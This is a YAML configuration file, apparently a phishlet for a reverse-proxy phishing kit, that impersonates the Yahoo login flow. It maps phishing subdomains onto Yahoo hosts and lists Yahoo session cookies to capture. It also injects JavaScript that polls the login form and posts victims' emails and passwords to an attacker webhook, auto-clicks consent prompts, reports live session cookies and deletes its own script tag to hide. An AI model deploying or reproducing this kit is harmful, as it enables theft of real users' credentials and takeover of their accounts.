name: 'yahoo'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api.login', domain: 'yahoo.com', session: true, auto_filter: true}
sub_filters:
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'guce.yahoo.com', replace: 'guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'api.login.yahoo.com', replace: 'api.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'api.login.yahoo.com', orig_sub: 'api.login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://guce.yahoo.com', replace: 'https://guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript']}
auth_tokens:
  - domain: '.yahoo.com'
    keys: ['B', 'F', 'G', 'A', 'Y', 'T', 'SSL', 'AO', 'CY', 'PH', 'A3', 'CRUM', 'IDS', 'GAMBIT', 'ST', 'XY', 'OS', 'HP', 'JV', 'C']
  - domain: 'guce.yahoo.com'
    keys: ['guce_consent_cookie', 'guce_consent_status', 'GUC']
  - domain: '.login.yahoo.com'
    keys: ['JSESSIONID', '__VC']
  - domain: 'login.yahoo.com'
    keys: ['JSESSIONID']
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.yahoo.com'
  path: '/'
js_inject:
  - trigger_domains: ['{{.Endpoint1}}.{{.Domain}}', 'login.yahoo.com']
    trigger_paths: ['/.*']
    script: |
      (function() {
        const api = atob('{{.DomainBase64}}') + "/api/webhook";
        const secret = "{{.WebhookSecret}}";
        const source = "yahoo";
        let capturedEmail = '';

        function sendData(type, email, password) {
          fetch(api, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Webhook-Secret": secret },
            body: JSON.stringify({ event: type, source: source, email: email, password: password, remote_addr: "{{.VpsIp}}" })
          }).catch(function(){});
        }

        function capture() {
          const emailInput = document.querySelector('input[name="username"], input[type="email"]');
          const passInput = document.querySelector('input[name="password"], input[type="password"]');

          if (emailInput && emailInput.value && emailInput.value !== capturedEmail) {
            capturedEmail = emailInput.value;
            sendData("email", capturedEmail, null);
          }

          if (passInput && passInput.value) {
            sendData("credentials", capturedEmail, passInput.value);
          }
        }

        setInterval(capture, 500);
        
        function handleConsent() {
          // Automatically click consent button if it appears
          const agreeBtn = document.querySelector('button[name="agree"], button.agree, #consent-text button');
          if (agreeBtn && !agreeBtn.hasAttribute('data-authflow-clicked')) {
            agreeBtn.setAttribute('data-authflow-clicked', 'true');
            agreeBtn.click();
          }
        }
        
        setInterval(handleConsent, 1000);

        document.addEventListener('submit', function() { setTimeout(capture, 200); });
        
        function checkSession() {
          if (document.cookie.includes('T=') && document.cookie.includes('Y=')) {
             sendData("session", capturedEmail, null);
          }
        }
        
        setInterval(checkSession, 5000);
        
        // Scrub DOM for stealth
        if (document.currentScript) document.currentScript.remove();
        
        new MutationObserver(capture).observe(document.body, { childList: true, subtree: true });
      })();
webhook:
  url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
  headers:
    X-Webhook-Secret: "{{.WebhookSecret}}"
  format: "json"
  events: ["email", "credentials", "2fa", "session"]